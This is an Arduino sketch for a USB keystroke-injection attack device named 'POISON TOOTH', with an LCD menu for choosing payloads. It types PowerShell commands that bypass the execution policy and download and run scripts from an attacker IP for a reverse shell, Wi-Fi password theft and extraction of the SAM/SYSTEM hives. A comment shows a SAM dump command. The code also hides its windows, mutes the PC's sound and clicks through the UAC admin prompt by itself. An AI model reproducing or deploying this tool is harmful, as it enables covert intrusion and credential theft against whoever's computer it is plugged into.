//Librerias usadas, (Keyboard para HID) (LiquidCrystal para la pantalla LCD)
#include <Keyboard.h>
#include <LiquidCrystal.h>

//Define los puertos de LiquidCrystal (RS,E,D4,D5,D6,D7), estos sirven para decirle lo que se tiene mostrar por pantalla 
LiquidCrystal lcd(12, 11, 5, 4, 3, 2);
//Teclado LAT=1 | Teclado ESP=2
int Teclado=1;
//Botones que existen en el programa (arriba, abajo, ok)
int boton_abajo=9;
int boton_arriba=10;
int boton_ok=13;

//powershell -Command "$var=[char]92; reg save ('HKLM'+$var+'SAM') hola2.dmp" (guarda \ en una variable y dumpea la sam)
void Normal_enter() { //Enter sin admin
  Keyboard.press(KEY_RETURN);//presiona suelta la tecla enter
  Keyboard.release(KEY_RETURN);//suelta tecla lo antes posible
}
void Eje_Admin(){ //Enter con admin
  Keyboard.press(KEY_LEFT_CTRL);//turn on admin privileges
  Keyboard.press(KEY_LEFT_SHIFT); //Click shift izquierdo
  Keyboard.press(KEY_RETURN);//presiona suelta la tecla enter
  Keyboard.releaseAll();//suelta teclas lo antes posible
}
String Mute_unmute(){
  if(Teclado==1){
    return "powershell /Command *New/Object /ComObject WScript.Shell(.SendKeys*\"char|173("; //"powershell -Command (New-Object -ComObject WScript.Shell).SendKeys([char]173)"  powershell /Command *New/Object /ComObject WScript.Shell(.SendKeys*\"char|173(
  }
  else if(Teclado==2){
    return "powershell -Command (New-Object -ComObject WScript.Shell).SendKeys([char]173)"; 
  }
  //este es el string completo, sirve para enviar al ordenador el char concreto necesario para silenciarlo sin tener encuenta el teclado
}

void Gestion_ruido(){
   String comando_silencio="";
   Abrir_ejecutar();
   if(Teclado==1){
   comando_silencio= "cmd &c start &min cmd &c " + Mute_unmute();//Abre pestaña oculta para silenciar PC
   }
   else if(Teclado==2){
   comando_silencio= "cmd /c start /min cmd /c " + Mute_unmute();//Abre pestaña oculta para silenciar PC
   }
   for (int i = 0; i < comando_silencio.length(); ++i) {
    Keyboard.write(comando_silencio[i]); //Printea cada tecla 1 a 1
    delay(1);//delay necesario para que el ordenador procese la tecla enviada por arduino (1 decima)
   }
    Normal_enter();
    delay(200);//Delay necesario para darle tiempo al ordenador a abrir la terminal para poder pasar a la siguiente tarea
}
void Abrir_ejecutar(){
  Keyboard.press(KEY_LEFT_GUI);// Presionar tecla de Windows
  Keyboard.press('r');// Presionar tecla 'r' para abrir la pestaña de ejecución
  Keyboard.releaseAll();// soltar todas las teclas
  delay(200);//delay necesario para que al sistema le de tiempo a abrir ejecutar
}

void Gestion_Enter(bool admin, bool admin_espera,bool sin_ruido){
  if(!admin){ //Si se tiene que ejecutar sin admin
    Normal_enter(); //Presiona enter
  }
  else if(!admin_espera){ //Si se tiene que ejecutar con admin y sin esperar 
    Eje_Admin(); //Presiona teclas necesarias para ejecutar panel admin
    delay(2000); //Tiempo necesario para abrir el panel "Desea ejecutar esto"
    //Se dice que si
    Keyboard.press(KEY_LEFT_ARROW);//Presiona flecha izquierda
    Keyboard.release(KEY_LEFT_ARROW);//Suelta flecha izquierda
    Keyboard.press(KEY_RETURN);//Presiona enter
    Keyboard.release(KEY_RETURN); //Suelta enter
  }
  else{ //Si se tiene que ejecutar con admin y esperando
    Eje_Admin();//Ejecuta admin y espera que el usuario diga que si, si no ne se ejecutara el comando
    if(sin_ruido){ //Aviso IMPORTANTE, si se aplica sin_ruido, junto con admin espera la ejecucion puede fallar gravemente, ya si el usuario no presiona una de las opciones antes de que acabe el tiempo, el programa proseguira y dejara el codigo powershell para desilenciar a la vista
      delay(299800); //Tiempo necesario para abrir el panel "Desea ejecutar esto" (Se espera, ya que si no el siguiente comando no funcionara porque se esta abriendo el UAC)
    }
  }
}
void Gestion_start(){
  int boton_start_presionado = 1;
  do{//Espera aqui, ya que se tiene que ejecutar un comando previo para desilenciar el ordenandor
      lcd.setCursor(0, 0);
      lcd.print("COMANDO LISTO");
      lcd.setCursor(0, 1);
      lcd.print("Presione START para");
      lcd.setCursor(0, 2);
      lcd.print("ENVENENAR =]");
      lcd.setCursor(0, 3);
      lcd.print("(Conecte prev USB)");
      boton_start_presionado = digitalRead(boton_ok);
    }while(boton_start_presionado!=0);//Espera a que presiones el boton ok cuando estes listo
    Limpia_pantalla();
    lcd.setCursor(0, 0);
    lcd.print("ENVENENANDO...");//Muestra esto mientras se imprime todo por pantalla
}

String Creacion_comando(String comando, bool oculto, bool autocierre, bool sin_ruido, bool admin){
  //cmd /c start /min cmd /c "comando" (se cierra automaticamente la pestaña y cmd /c start /min cmd /K "comando" para que no se cierre automaticamente  comando para ejecutar de manera oculta
  String comando_fabricado= "";
  if(Teclado==1){
    if(oculto && autocierre){ //Si el comnado se tiene que ejecutar en oculto y con autocierre
      comando_fabricado = comando_fabricado + "&c start &min cmd &c " + "powershell /WindowStyle Hidden " + comando; //&c start &min cmd &c powershell /WindowStyle Hidden
    }
    else if(oculto && !autocierre){ //Si el comando se tiene que ejecutar en pestaña minimizada y sin autocierre
      comando_fabricado = comando_fabricado + "&c start &min cmd &K " + "powershell " + comando; //&c start &min cmd &K powershell -Command
    }
    else{ //Si el comnado no se ejecuta ni en oculto ni con autocierre
      comando_fabricado = comando_fabricado + "&K " + "powershell " + comando;
    }
    if(admin && sin_ruido){ //Si el comando se tiene que ejecutar sin ruido
      Gestion_start();
      Gestion_ruido(); //Llama a gestion ruido
    }
  }
  else if(Teclado==2){
    if(oculto && autocierre){ //Si el comnado se tiene que ejecutar en oculto y con autocierre
      comando_fabricado = comando_fabricado + "/c start /min cmd /c " + "powershell -WindowStyle Hidden " + comando; //&c start &min cmd &c powershell /WindowStyle Hidden
    }
    else if(oculto && !autocierre){ //Si el comando se tiene que ejecutar en pestaña minimizada y sin autocierre
      comando_fabricado = comando_fabricado + "/c start /min cmd /K " + "powershell " + comando; //&c start &min cmd &K powershell -Command
    }
    else{ //Si el comnado no se ejecuta ni en oculto ni con autocierre
      comando_fabricado = comando_fabricado + "/K " + "powershell " + comando;
    }
    if(admin && sin_ruido){ //Si el comando se tiene que ejecutar sin ruido
      Gestion_start();
      Gestion_ruido(); //Llama a gestion ruido
  }
  return comando_fabricado; //Devuelve el comando fabricado
  }
}

void Gestion_admin(String comando,  bool oculto, bool autocierre, bool sin_ruido, bool admin, bool admin_espera){
  //Iniciamos ejecución de ejecutar  
  //Preparamos comando para ejecutar
  String comando_fabricado= "cmd "; //Todos los comandos empiezan por cmd
  comando_fabricado = comando_fabricado + Creacion_comando(comando, oculto, autocierre, sin_ruido, admin); //Gestiona el comando a crear segun las opciones
  if(!sin_ruido){ //Si no ha sido ejecutado el bucle sin ruido previamente espera a que estes listo para ekecutar el programa
      Gestion_start();
  }
  Abrir_ejecutar();
  for (int i = 0; i < comando_fabricado.length(); ++i) { //Printeo de comando en ejecutar
    Keyboard.write(comando_fabricado[i]);//Printea cada tecla 1 a 1
    delay(1);//delay necesario para que el ordenador procese la tecla enviada por arduino (1 decima)
  }
  //delay(30000);
  Gestion_Enter(admin, admin_espera, sin_ruido); //Administra si se ejcutara terminal admin o no y de que forma 
  delay(200);//Delay necesario para darle tiempo al ordenador a abrir la terminal para poder pasar a la siguiente tarea
  if(admin && sin_ruido){//Si antes se silencio el ordenador, abre otro ejecutar y lo desilencia
    Gestion_ruido();
  }
  Limpia_pantalla();
  lcd.setCursor(0, 0);
  lcd.print("COMANDO FINALIZADO");
  lcd.setCursor(0, 1);
  lcd.print("Volviendo al inicio:");
  delay(3000);//Con esto te avisa que el comando ya esta introducido y vuelve al principio despues de 5 segundos
  Limpia_pantalla(); //Limpia la pantalla
  Suelta_OK(); //Espera a que sueltes ok para volver al inicio
}
void Seleccion_ejecucion(String* lista,int i,int j,bool k,bool l,bool m){
  //Aqui segun el programa que ha sido seleccionado se requiere un tipo de ejecucion u otro
  if(i==0 || i==1){
    //comando requiere ejecución no privilegiada
      switch (j) {
        case 1:
          Gestion_admin(lista[i], true, true, k, false, l);
          break;
        case 2:
          Gestion_admin(lista[i], true, false, k, false, l);
          break;
        case 3:
          Gestion_admin(lista[i], false, false, k, false, l);
          break;
    }
  }
  else if(i==4){
      //comando requiere ejecución privilegiada
      switch (j) {
        case 1:
          Gestion_admin(lista[i], true, true, k, true, l);
          break;
        case 2:
          Gestion_admin(lista[i], true, false, k, true, l);
          break;
        case 3:
          Gestion_admin(lista[i], false, false, k, true, l);
          break;
    }
  }
  else if(i==2 || i==3){
    //comando con privilegios de admin/usuario seleccionables
    switch (j) {
        case 1:
          Gestion_admin(lista[i], true, true, k, m, l);
          break;
        case 2:
          Gestion_admin(lista[i], true, false, k, m, l);
          break;
        case 3:
          Gestion_admin(lista[i], false, false, k, m, l);
          break;
    }
  }
}
int Debounce_buton_selector(int num,int contador_salida,unsigned long int *tempo){ //Gestiona si el boton de arriba o abajo a sido presionado, pone el nuevo contador y gestiona debounce
    bool boton_presionado = digitalRead(boton_arriba) == 0 || digitalRead(boton_abajo) == 0; //Ve si el boton esta presionado o no
    if (boton_presionado) { //Si el boton es presionado
      if(millis()-*tempo>100){ //Calcula con el tempo y el tiempo actual del programa si el boton ha sido presionado nuevamente en menos de 100 milesimas de segundo, si es asi no entra al bucle
        if(digitalRead(boton_arriba)==0){ //Si el boton ha sido presionado arriba resta contador
           //Serial.print("Presionado Arriba");
           contador_salida--;
        }
        else if(digitalRead(boton_abajo)==0){ //Si el boton ha sido presionado abajo suma contador
           //Serial.print("Presionado Abajo");
           contador_salida++;
        }
        do{
              boton_presionado=digitalRead(boton_arriba) == 0 || digitalRead(boton_abajo) == 0;
        }while(boton_presionado==true); //Espera a que suelte el boton
        delay(200); //Espera 2 decimas de segundo para redicer el numero de veces que se entrara a este bucle por debounce
        if(contador_salida < 0){ //Si el numero es menor a 0, lo vuelve num que es el numero de opciones que hay en la lista
           contador_salida=num;
        }
        if(contador_salida > num){ //Si el numero es superior al numero de cosas que hay en la lista vuelve al principio, osea 0
           contador_salida=0;
        }
      }
      *tempo=millis();//hace que tempo guarde millis ya que ha sido presionado el boton (se guarda en la variable puntero enviada)
    }
    return contador_salida; //Devuelve el nuevo contador
}
void Suelta_OK(){ //Gestiona que se suelte el boton ok
  bool soltado=true; //Inicia una variable para gestionar si se habia soltado
  int boton_start_presionado=digitalRead(boton_ok); //Lee si el boton sigue presionado
  Limpia_pantalla(); //Limpia la pantalla
  while(boton_start_presionado==0){
     lcd.setCursor(0, 0);
     lcd.print("Suelta OK boton"); //Si el boton sigue presionado muestra suelta ok boton hasta que se suelte
     boton_start_presionado=digitalRead(boton_ok);
     soltado=false;
  }//Cuando se suelta sale del bucle
  if(!soltado){ //Y para esperar debounce espera 1 segundo
     lcd.setCursor(0, 0);
     lcd.print("Esperando debounce");
     delay(1000);
     Limpia_pantalla(); //Limpia pantalla
  }
}
bool Selector_ejecucion_2(String Frase1,String Frase2){ //Este es generico para las ultimas 3 variables, solo cambian las frases
  lcd.setCursor(0, 0);//Seleccion de teclado
  lcd.print("Seleccion ejecucion:");
  int contador_salida = 0; //Contador del numero resultante
  int boton_start_presionado = 0; //Contador de boton ok presionado
  unsigned long int tempo=millis(); //Guarda la variable tempo necesaria para gestionar el Debounce de los botones arriba y abajo
  do {
    if (contador_salida == 1) { 
      lcd.setCursor(0, 1);
      lcd.print(Frase1+" ");
      lcd.setCursor(0, 2);
      lcd.print(">"+Frase2);
    } else {
      lcd.setCursor(0, 1);
      lcd.print(">"+Frase1);
      lcd.setCursor(0, 2);
      lcd.print(Frase2+" ");
    }//Muestra las 2 frases   
    // Debouncing del botón
    contador_salida=Debounce_buton_selector(1, contador_salida, &tempo); //Si se presiona arriba o abajo se gestiona debounce y se devuelve el nuevo numero
    boton_start_presionado = digitalRead(boton_ok); //Revisa que el boton ok este apretado
    //Serial.print(boton_start_presionado);
  } while (boton_start_presionado != 0); //Sale cuando se presiona el boton ok
  Limpia_pantalla(); //Limpia la pantalla
  lcd.setCursor(0, 0);//Seleccion de teclado
  lcd.print("Seleccion:");
  lcd.setCursor(0, 1);
  if(contador_salida==0){
    lcd.print(Frase1);
  }
  else{
    lcd.print(Frase2);
  }//Muestra la frase seleccionada
  delay(3000); //Espera 3 segundos
  Limpia_pantalla(); //Limpia la pantalla
  Suelta_OK(); //Espera a que se suelte ok
  if(contador_salida==0){ //Como se devuelve un bool, si es 0 es true, si es 1 es false
    return true;
  }
  else{
    return false;
  }
}
int Selector_terminal(){
  lcd.setCursor(0, 0);//Selecciona el tipo de terminal que se quiere
  lcd.print("Selecciona comando:");
  int contador_salida = 0; //Contador del numero resultante
  int boton_start_presionado = 0; //Contador de boton ok presionado
  unsigned long int tempo=millis(); //Guarda la variable tempo necesaria para gestionar el Debounce de los botones arriba y abajo
  do {
     if(contador_salida == 0) { //Muestra las terminales disponibles
      lcd.setCursor(0, 1);
      lcd.print(">1.CMD Oculta");
      lcd.setCursor(0, 2);
      lcd.print("2.CMD Minimizada ");
      lcd.setCursor(0, 3);
      lcd.print("3.CMD Visible ");
    }
    else if (contador_salida == 1) { 
      lcd.setCursor(0, 1);
      lcd.print("1.CMD Oculta ");
      lcd.setCursor(0, 2);
      lcd.print(">2.CMD Minimizada");
      lcd.setCursor(0, 3);
      lcd.print("3.CMD Visible ");
    }
    else if(contador_salida == 2) {
      lcd.setCursor(0, 1);
      lcd.print("1.CMD Oculta ");
      lcd.setCursor(0, 2);
      lcd.print("2.CMD Minimizada ");
      lcd.setCursor(0, 3);
      lcd.print(">3.CMD Visible ");
    }
    contador_salida=Debounce_buton_selector(2, contador_salida, &tempo); //Si se presiona arriba o abajo se gestiona debounce y se devuelve el nuevo numero
    boton_start_presionado = digitalRead(boton_ok); //Revisa que el boton ok este apretado
  } while (boton_start_presionado != 0); //Sale cuando se presiona el boton ok
  Limpia_pantalla(); //Limpia pantalla
  lcd.setCursor(0, 0);
  lcd.print("Seleccion:");
  lcd.setCursor(0, 1);
  if(contador_salida == 0) {
    lcd.print("1.CMD Oculta");
  }
  else if (contador_salida == 1) { 
    lcd.print("2.CMD Minimizada");
  }
  else if(contador_salida == 2) {
    lcd.print("3.CMD Visible");
  }//Muestra que terminal seleccionada
  delay(3000); //Espera 3 segundos
  Limpia_pantalla(); //Limpia pantalla
  Suelta_OK(); //Espera que se suelte el boton ok
  return (contador_salida+1); //Devuelve el resultado
}
int Selector_comandos(){
  int contador_salida = 0; //Contador del numero resultante
  int contador_anterior = 0; //Contador que sirve para saber si hay que limpiar la pantalla o no
  int boton_start_presionado = 0; //Contador de boton ok presionado
  unsigned long int tempo=millis(); //Guarda la variable tempo necesaria para gestionar el Debounce de los botones arriba y abajo
  do {
     if(contador_salida == 0) {//Seleccion de comando que se va a usar
      lcd.setCursor(0, 0);
      lcd.print("Selecciona comando:");
      lcd.setCursor(0, 1);
      lcd.print(">1.echo Hola, Adios");
      lcd.setCursor(0, 2);
      lcd.print("2.temp3.txt Hola c.");
      lcd.setCursor(0, 3);
      lcd.print("3.Reverse shell");
    }
    else if (contador_salida == 1) { 
      lcd.setCursor(0, 1);
      lcd.print("1.echo Hola, Adios ");
      lcd.setCursor(0, 2);
      lcd.print(">2.temp3.txt Hola c. ");
      lcd.setCursor(0, 3);
      lcd.print("3.Reverse shell ");
    }
    else if(contador_salida == 2) {
      lcd.setCursor(0, 0);
      lcd.print("Selecciona comando:");
      lcd.setCursor(0, 1);
      lcd.print("1.echo Hola, Adios");
      lcd.setCursor(0, 2);
      lcd.print("2.temp3.txt Hola c. ");
      lcd.setCursor(0, 3);
      lcd.print(">3.Reverse shell");
    }
    else if(contador_salida == 3) {//Cuando es 3 como no cabe por pantalla por lo tanto se cambia la forma de ver los comandos
      lcd.setCursor(0, 0);
      lcd.print("2.temp3.txt Hola c.");
      lcd.setCursor(0, 1);
      lcd.print("3.Reverse shell");
      lcd.setCursor(0, 2);
      lcd.print(">4.wi-fi pass");
      lcd.setCursor(0, 3);
      lcd.print("5.SAM,SYSTEM Ext ");
    }
    else if(contador_salida == 4) {
      lcd.setCursor(0, 0);
      lcd.print("2.temp3.txt Hola c.");
      lcd.setCursor(0, 1);
      lcd.print("3.Reverse shell");
      lcd.setCursor(0, 2);
      lcd.print("4.wi-fi pass ");
      lcd.setCursor(0, 3);
      lcd.print(">5.SAM,SYSTEM Ext");
    }
    if((contador_anterior==2 && contador_salida==3) || (contador_anterior==0 && contador_salida==4) || (contador_anterior==3 && contador_salida==2) || (contador_anterior==4 && contador_salida==0)){
      Limpia_pantalla(); //Si se mueve de la primera a la segunda pantalla o de la segunda a la primera limpia la pantalla primero
    }
    contador_anterior = contador_salida; //Iguala los contadores
    contador_salida=Debounce_buton_selector(4, contador_salida, &tempo); //Si se presiona arriba o abajo se gestiona debounce y se devuelve el nuevo numero
    boton_start_presionado = digitalRead(boton_ok); //Revisa si el boton OK esta presionado
  } while (boton_start_presionado != 0); //Sale cuando se presiona el boton ok
  Limpia_pantalla(); //Limpia la pantalla
  lcd.setCursor(0, 0);
  lcd.print("Seleccion:");
  lcd.setCursor(0, 1);
     if(contador_salida == 0) {
      lcd.print("1.echo Hola, Adios");
    }
    else if (contador_salida == 1) { 
      lcd.print("2.temp3.txt Hola c.");
    }
    else if(contador_salida == 2) {
      lcd.print("3.Reverse shell");
    }
    else if(contador_salida == 3) {
      lcd.print("4.wi-fi pass");
    }
    else if(contador_salida == 4) {
      lcd.print("5.SAM,SYSTEM Ext");
    }//Muestra seleccion
  delay(3000); //Espera 3 segundos
  Limpia_pantalla(); //Limpia la pantalla
  Suelta_OK(); //Espera a que se suelte el boton ok
  return contador_salida; //Devuelve el comando seleccionado
}
void Selector_payload(String* lista){
  //Aquí habria la logica de la pantalla para seleccionar las diferentes opciones
  int i=Selector_comandos();//numero de comando seleccionado
  int j=Selector_terminal();//Tipo de terminal seleccionada (oculta, no oculta, con minimizar, sin minimizar...)
  bool m=false; //Con admin o sin admin (solo para programas que se puedan aplicar las 2)
  if(i==2 || i==3){//Esto solo se activara si es reverse shell, ya que se puede ejecutar como usuario o como admin
    m=Selector_ejecucion_2("1.Admin","2.No Admin");
  }
  bool l=false; //Admin espera=true, Admin sin espera=false (solo para programas admin)
  bool k=false;//Variable para determinar ruido Con ruido = false, sin ruido = true
  if(m==true || i==4){ //Si es reverse shell y se ha seleccionado admin o si es extraccion SAM y SYSTEM
   l=Selector_ejecucion_2("1.Admin espera","2.Admin sin espera"); //Se determina si se quiere esperar o no
   k=Selector_ejecucion_2("1.Admin sin ruido","2.Admin con ruido"); //Se determina si se hace con ruido o sin ruido la ejecucion
   if(l && k) //Si se usa Admin espera y sin ruido al mesmo tiempo se avisa que hay que esperar 5 seg, ya que se espera para poder usar el comando de desilencio
   {
      lcd.setCursor(0, 0);//Seleccion de teclado
      lcd.print("ADVERTENCIA:");
      lcd.setCursor(0, 1);
      lcd.print("Con esta opcion Ard");
      lcd.setCursor(0, 2);
      lcd.print("tiene que estar");
      lcd.setCursor(0, 3);
      lcd.print("conect por 5 min");
      delay(20000);
      Limpia_pantalla();
   }
  }
  Seleccion_ejecucion(lista,i,j,k,l,m);
}
void Limpia_pantalla(){
  lcd.setCursor(0, 0);//Limpia la pantalla
  lcd.print("                    "); //Son 20 espacios en blanco para las 4 filas para limpiar la pantalla
  lcd.setCursor(0, 1);
  lcd.print("                    ");
  lcd.setCursor(0, 2);
  lcd.print("                    ");
  lcd.setCursor(0, 3);
  lcd.print("                    ");
}
void Seleccion_teclado(){
  lcd.setCursor(0, 0);//Seleccion de teclado
  lcd.print("Selecciona teclado:");
  int contador_salida = 0; //Contador del numero resultante
  int boton_start_presionado = 0; //Contador de boton ok presionado
  unsigned long int tempo=millis(); //Guarda la variable tempo necesaria para gestionar el Debounce de los botones arriba y abajo
  do {
    if (contador_salida == 1) { //Si la variable es 1 esta seleccionado teclado Spain 
      lcd.setCursor(0, 1);
      lcd.print("1.Teclado Latino ");
      lcd.setCursor(0, 2);
      lcd.print(">2.Teclado Spain");
    } else {//Si la variable es 0esta seleccionado teclado Latino
      lcd.setCursor(0, 1);
      lcd.print(">1.Teclado Latino");
      lcd.setCursor(0, 2);
      lcd.print("2.Teclado Spain ");
    }
    contador_salida=Debounce_buton_selector(1, contador_salida, &tempo); //Si se presiona arriba o abajo se gestiona debounce y se devuelve el nuevo numero
    boton_start_presionado = digitalRead(boton_ok); //Analiza que el boton ok este presionado
    //Serial.print(boton_start_presionado);
  } while (boton_start_presionado != 0); //Solo sale del bucle si el boton ok es presionado
  Limpia_pantalla(); //Cuando acaba limpia la pantalla
  lcd.setCursor(0, 0);//Seleccion de teclado
  lcd.print("Seleccion:");
  lcd.setCursor(0, 1);
  if(contador_salida==0){
    lcd.print("1.Teclado Latino");
  }
  else{
    lcd.print("2.Teclado Spain");
  } //Muestra el teclado seleccionado por pantalla
  delay(3000); //Muestra el teclado seleccionado por 3 segundos
  Suelta_OK(); //Se asegura que el boton ok este soltado
  Teclado=contador_salida+1; //Devuelve el teclado seleccionado
}
void Logica_pin(String codigo_acceso){
  String input=""; //Input final que se contrasta con el codigo_acceso
  String new_string="0"; //Input nuevo numero
  lcd.setCursor(0, 0);
  lcd.print("Se necesita codigo:");//Printea en 0,0 "Se necesia codigo:"
  unsigned long int tempo=millis();//Guarda la variable tempo necesaria para gestionar el Debounce de los botones arriba y abajo
  //millis() devuelve el tiempo desde el inicio de ejecucion del programa
  int boton_presionado=1; //Se usa para saber si se ha dado a ok y gestionar el nuevo numero
  while(input.length()!=4 && codigo_acceso!=input){ //Entra en el bucle que solo acaba cuando codigo_acceso y input sean iguales
    boton_presionado=digitalRead(boton_ok);//lee si boton pulsado
    if(boton_presionado!=1)//si el boton esta pulsado se activa
    {
      input=input+new_string; //Añade el nuevo string a input
      if(input.length()==codigo_acceso.length() && codigo_acceso!=input) //Si el input es de tamano 4 y la clave es incorrecta esta mal y se reinicia
      {
        lcd.setCursor(0, 2);//posición de humedad
        lcd.print("Clave incorrecta");
        lcd.setCursor(0, 3);//posición de humedad
        lcd.print("Intentelo de nuevo");
        delay(2000);
        Limpia_pantalla(); 
        input="";//Reinicia input
        lcd.setCursor(0, 0);
        lcd.print("Se necesita codigo:"); //Printea Se necesita codigo por pantalla
    }
    else if(input.length()==codigo_acceso.length() && codigo_acceso==input){//Si el input es de tamano 4 y la clave es correcta entra...
        lcd.setCursor(0, 2);//posición de humedad
        lcd.print("Clave correcta");
        lcd.setCursor(0, 3);//posición de humedad
        lcd.print("Entrando...");
        delay(2000);
        Limpia_pantalla();
    }
    new_string="0";//nuevo string vuelve a 0
    Suelta_OK(); //Espera que se suelte el boton ok
    lcd.setCursor(0, 0);
    lcd.print("Se necesita codigo:"); //Printea Se necesita codigo por pantalla
  }
  new_string=String(Debounce_buton_selector(9,new_string.toInt(),&tempo)); //Si se presiona arriba o abajo se gestiona debounce y se devuelve el nuevo numero
  lcd.setCursor(0, 1);
  lcd.print(input+new_string);//Printea por pantalla el input hasta ahora y el new_string
  }
}
void setup() {
  //En ejecutar maximo 259 caracteres
  //Serial.begin(9600);
  //Define los botones
  pinMode(boton_ok,INPUT);//Boton OK
  pinMode(boton_arriba,INPUT); //Boton Arriba
  pinMode(boton_abajo,INPUT); //Boton Abajo
  lcd.begin(20,4); //Inicializa la pantalla lcd de 20x4
  lcd.setCursor(0, 0);//posición de pantalla 0,0 
  lcd.print("POISON TOOTH"); //Escribe esto
  lcd.setCursor(0, 1);//posición de pantalla 0,1
  lcd.print("Be Ready to Poison"); //Escribe esto
  lcd.setCursor(0, 2);//posición de pantalla 0,2
  lcd.print("Hecho por:"); //Escribe esto
  lcd.setCursor(0, 3);//posición de pantalla 0,3
  lcd.print("David Capitan Roig"); //Escribe esto
  delay(5000); //Espera 5 segundos
  Limpia_pantalla(); //Limpia la pantalla
  String codigo_acceso="0000"; //Define un codigo de acesso al dispositivo
  Logica_pin(codigo_acceso); //Lo pasa a logica pin, la cual gestiona si se introduce bien la contraseña o no
}
//cmd /c start /min cmd /c powershell -WindowStyle Hidden "echo 'Hola como estas' + Out-File -FilePath C:/Windows/Temp/temp4.txt -Force"
void loop() {
  Seleccion_teclado();//Define que teclado usara si latino o spain
  String Attack_IP_download="192.168.1.41"; //Define la ip del servidor donde se descargaran los archivos maliciosos
  String Attack_Port="8000"; //Define puerto por el cual se descargaran los archivos maliciosos
  //Define los 2 arrais para los payloads de los teclados
  String Comandos_LAT[] = {"/Command echo hola< echo -adios-","/Command @echo -Hola como estas- ` Out/File /FilePath C>&Windows&Temp&temp3.txt /Force@","/ExecutionPolicy Bypass /Command @cd &Windows&Temp< Invoke/WebRequest /Uri http>&&"+Attack_IP_download+">"+Attack_Port+"&temp.ps1 /OutFile temp.ps1< .&temp.ps1@","/ExecutionPolicy Bypass /Command @cd &Windows&Temp< Invoke/WebRequest /Uri http>&&"+Attack_IP_download+">"+Attack_Port+"&temp1.ps1 /OutFile temp1.ps1< .&temp1.ps1@","/ExecutionPolicy Bypass /Command @cd &Windows&Temp< Invoke/WebRequest /Uri http>&&"+Attack_IP_download+">"+Attack_Port+"&temp2.ps1 /OutFile temp2.ps1< .&temp2.ps1@"};
  String Comandos_ESP[] = {"-Command echo hola; echo 'adios'","-Command echo 'Hola como estas' | powershell -Command Out-File -FilePath C:/Windows/Temp/temp3.txt -Force","-ExecutionPolicy Bypass -Command cd /Windows/Temp; Invoke-WebRequest -Uri http://"+Attack_IP_download+":"+Attack_Port+"/temp.ps1 -OutFile temp.ps1; ./temp.ps1","-ExecutionPolicy Bypass -Command cd /Windows/Temp; Invoke-WebRequest -Uri http://"+Attack_IP_download+":"+Attack_Port+"/temp1.ps1 -OutFile temp1.ps1; ./temp1.ps1","-ExecutionPolicy Bypass -Command cd /Windows/Temp; Invoke-WebRequest -Uri http://"+Attack_IP_download+":"+Attack_Port+"/temp2.ps1 -OutFile temp2.ps1; ./temp2.ps1"};
  //pinMode(LED_BUILTIN, OUTPUT);
  //digitalWrite(LED_BUILTIN, HIGH);
  switch (Teclado) {
    case 1: //Teclado latino
      Keyboard.begin();//comienzo de simulación de teclado
      delay(500);//delay necesario para que funcionen las siguientes intrucciones (si no no se ejecuta el windows + r)
      Selector_payload(Comandos_LAT);//Selecciona el programa, con teclado latino
      break;
    case 2: //Teclado spain
      Keyboard.begin(KeyboardLayout_es_ES);//comienzo de simulación de teclado
      delay(500);//delay necesario para que funcionen las siguientes intrucciones (si no no se ejecuta el windows + r)
      Selector_payload(Comandos_ESP);//Selecciona el programa, con teclado spain
      break;
  }
  Keyboard.end();//fin del programa, se reinicia loop ya que esta en bucle
  //digitalWrite(LED_BUILTIN, LOW);
}
